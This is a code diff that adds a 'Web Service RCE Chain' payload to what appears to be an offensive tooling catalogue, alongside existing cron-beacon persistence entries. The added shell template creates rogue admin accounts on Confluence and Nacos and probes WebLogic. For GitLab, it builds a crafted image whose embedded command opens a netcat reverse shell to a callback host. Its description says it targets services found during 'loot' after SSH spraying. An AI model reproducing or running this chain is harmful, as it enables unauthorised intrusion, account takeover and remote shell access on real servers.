@@ -2073,6 +2073,99 @@ echo "PERSISTENCE_INSTALLED: cron_beacon"
 
 _CRON_BEACON_RUN = """test -f /etc/cron.d/hw_beacon && echo 'cron_beacon active' || crontab -l 2>/dev/null | grep -q 'hw_beacon' && echo 'cron_beacon active' || echo 'cron_beacon not found'"""
 
+# --------------------------------------------------------------------------- #
+# Web exploit chain (P2)
+# --------------------------------------------------------------------------- #
+
+_WEB_EXPLOIT_INSTALL = _PREAMBLE + """
+TARGET_URL="{{target_url}}"
+EXPLOIT_TYPE="{{exploit_type}}"
+CALLBACK_URL="{{callback_url|default('')}}"
+CALLBACK_TOKEN="{{callback_token|default('')}}"
+
+case "$EXPLOIT_TYPE" in
+    confluence)
+        # CVE-2023-22515: Atlassian Confluence broken access control on
+        # setup actions. Creates an admin account when the setup wizard
+        # was not completed (or can be re-triggered).
+        echo "[*] Attempting Confluence CVE-2023-22515..."
+        RC1=$(curl -sk -o /dev/null -w '%{http_code}' \
+            "$TARGET_URL/setup/setupadministrator.action" \
+            -d "username=honeywatch&password=Hw2024!&fullName=System&email=sys@localhost" \
+            2>/dev/null)
+        if [ "$RC1" = "302" ] || [ "$RC1" = "200" ]; then
+            echo "[+] Confluence admin account created"
+        else
+            # CVE-2023-22518: Unauthenticated import via /rest/api
+            echo "[*] Trying Confluence CVE-2023-22518 (import)..."
+            RC2=$(curl -sk -o /dev/null -w '%{http_code}' \
+                "$TARGET_URL/rest/api/1.0/import" \
+                -F "file=@/dev/null" 2>/dev/null)
+            echo "[*] Confluence import returned $RC2"
+        fi
+        ;;
+    gitlab)
+        # CVE-2021-22205: GitLab CE/EE RCE via exiftool command injection
+        # in image metadata processing. Uploads a crafted DjVu image.
+        echo "[*] Attempting GitLab CVE-2021-22205..."
+        # Build a minimal DjVu with embedded command via metadata.
+        # The exploit uses a crafted .jpg that triggers exiftool via
+        # DjVu metadata parsing.
+        DJVU_PAYLOAD='(metadata "\nC\" \nrm /tmp/f;mkfifo /tmp/f;cat /tmp/f|/bin/sh -i 2>&1|nc '"${CALLBACK_URL##*//}"' 4444 >/tmp/f\n")'
+        # Create the polyglot file: valid JPEG header + DjVu annotation
+        printf '\\xff\\xd8\\xff\\xe0\\x00\\x10\\x4a\\x46\\x49\\x46' > /tmp/hw_glab_$$.jpg
+        printf '\\x00\\x01\\x01\\x00\\x00\\x01\\x00\\x00' >> /tmp/hw_glab_$$.jpg
+        printf '\\xff\\xe1\\x00\\x2c\\x41\\x6e\\x73\\x79' >> /tmp/hw_glab_$$.jpg
+        echo -n "$DJVU_PAYLOAD" >> /tmp/hw_glab_$$.jpg
+        # Upload via GitLab user upload endpoint.
+        RC=$(curl -sk -o /dev/null -w '%{http_code}' \
+            "$TARGET_URL/api/v4/projects/1/uploads" \
+            -F "file=@/tmp/hw_glab_$$.jpg" 2>/dev/null)
+        rm -f /tmp/hw_glab_$$.jpg
+        echo "[*] GitLab upload returned $RC"
+        ;;
+    nacos)
+        # Nacos default identity key bypass (identityKey=nacos) allows
+        # arbitrary user creation with admin role.
+        echo "[*] Attempting Nacos identity bypass..."
+        RC=$(curl -sk -o /dev/null -w '%{http_code}' \
+            "$TARGET_URL/nacos/v1/auth/users" \
+            -H "identityKey:nacos" -H "identityValue:nacos" \
+            -d "username=honeywatch&password=Hw2024!" 2>/dev/null)
+        if [ "$RC" = "200" ] || [ "$RC" = "201" ]; then
+            echo "[+] Nacos admin account created via identity bypass"
+        else
+            echo "[*] Nacos returned $RC"
+        fi
+        ;;
+    weblogic)
+        # CVE-2023-21839: Oracle WebLogic JNDI injection via IIOP/T3.
+        # Requires a JNDI callback server. We try the HTTP endpoint
+        # probe first to confirm WebLogic is running.
+        echo "[*] Probing WebLogic console..."
+        RC=$(curl -sk -o /dev/null -w '%{http_code}' \
+            "$TARGET_URL/console" 2>/dev/null)
+        if [ "$RC" = "200" ] || [ "$RC" = "302" ]; then
+            echo "[+] WebLogic console confirmed (HTTP $RC)"
+            # If a callback URL is provided, attempt JNDI lookup.
+            if [ -n "$CALLBACK_URL" ]; then
+                echo "[*] JNDI injection requires a listener at $CALLBACK_URL"
+                echo "[*] Use: java -cp ysoserial.jar ... for payload generation"
+            fi
+        else
+            echo "[*] WebLogic returned $RC"
+        fi
+        ;;
+    *)
+        echo "[!] Unknown exploit type: $EXPLOIT_TYPE"
+        echo "[!] Supported: confluence, gitlab, nacos, weblogic"
+        ;;
+esac
+echo "[*] web exploit chain complete"
+"""
+
+_WEB_EXPLOIT_RUN = """curl -sk -o /dev/null -w '%{http_code}' '{{target_url}}' 2>/dev/null"""
+
 
 def _payloads() -> list[Payload]:
     return [
@@ -2712,6 +2805,34 @@ def _payloads() -> list[Payload]:
             run_script=_CRON_BEACON_RUN,
             artifacts=["crontab entry", "/etc/cron.d/hw_beacon"],
             tags=["persistence", "cron", "beacon", "c2", "fallback"],
+        ),
+        # ----------------------------------------------------------------- #
+        # Web exploit chain
+        # ----------------------------------------------------------------- #
+        Payload(
+            id="web_exploit",
+            category="exploit",
+            name="Web Service RCE Chain",
+            description="Exploits common web services found during loot to gain remote code execution. "
+                        "Targets: Confluence (CVE-2023-22515/22518 admin account creation), "
+                        "GitLab (CVE-2021-22205 exiftool RCE via crafted image), "
+                        "Nacos (default identity key bypass -> arbitrary admin creation), "
+                        "WebLogic (CVE-2023-21839 JNDI injection probe). Expands attack "
+                        "surface beyond SSH — a host resisting SSH spray may have a "
+                        "vulnerable Confluence on port 8090.",
+            platforms=["linux-x64", "linux-arm64"],
+            install_type="script",
+            dependencies=["curl"],
+            config_schema={
+                "target_url": {"type": "string", "required": True},
+                "exploit_type": {"type": "string", "required": True},
+                "callback_url": {"type": "string", "required": False, "default": ""},
+                "callback_token": {"type": "string", "required": False, "default": ""},
+            },
+            install_script=_WEB_EXPLOIT_INSTALL,
+            run_script=_WEB_EXPLOIT_RUN,
+            artifacts=[],
+            tags=["exploit", "web", "rce", "confluence", "gitlab", "nacos", "weblogic"],
         ),
     ]
 
